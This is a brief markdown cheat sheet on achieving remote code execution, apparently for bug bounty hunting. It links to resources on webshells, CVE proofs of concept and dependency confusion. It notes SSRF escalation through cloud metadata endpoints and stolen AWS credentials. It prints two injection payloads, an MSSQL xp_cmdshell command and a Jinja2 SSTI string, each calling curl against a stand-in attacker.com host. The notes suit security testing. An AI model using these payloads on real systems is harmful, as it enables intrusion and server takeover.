[7 Ways to achieve RCE](https://www.intigriti.com/researchers/blog/hacking-tools/7-ways-to-achieve-remote-code-execution-rce)

## FIle Uploads 
[PHP WebShells](https://www.youtube.com/watch?v=uGk5_yDbSeQ)

## Common Vulnerabilities and Exposures (CVEs)
1. Use Nuclei 
2. [All available and newest CVEs with their PoC.](https://github.com/trickest/cve/)

## Server-side request forgery (SSRF)
### Escalating an SSRF to RCE by leveraging an internal service:
PDF Generators: Eg you can read local files by injecting an IFRAME

### Escalating an SSRF to RCE by exposing secrets
Hitting cloud meta data end points 
Using exposed credentials with AWS CLI to probe target access controls 


## https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
[Dependency Confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

## Injection Attacks
### SQLi
Microsoft SQL Server with xp_cmdshell function enabled

    EXEC xp_cmdshell 'curl https://attacker.com/';


### SSTI 
Jinja2

    {{''.__class__.mro()[1].__subclasses__()[CLASS_ID]('curl https://attacker.com',shell=True,stdout=-1).communicate()}}

### XSS to RCE
Craft a payload that takes advantage of a feature that only admins have access to
Your POC can create an admin acc or upload a webshell 
[XSS-RCE](https://brutelogic.com.br/blog/xss-and-rce/)

## Sensitive Data Exposure